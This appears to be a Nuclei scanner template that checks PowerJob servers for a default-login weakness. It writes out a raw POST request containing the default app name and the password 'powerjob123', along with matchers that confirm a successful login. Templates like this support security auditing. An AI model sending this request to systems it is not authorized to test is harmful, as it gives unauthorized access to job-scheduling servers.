id: powerjob-default-login

info:
  name: PowerJob - Default Login
  author: j4vaovo
  severity: high
  description: |
    PowerJob  default login vulnerability.
  reference:
    - https://www.yuque.com/powerjob/guidence/trial
  tags: powerjob,default-login

requests:
  - raw:
      - |
        POST /appInfo/assert HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"appName":"powerjob-worker-samples","password":"powerjob123"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{"success":true,"data":'

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 200
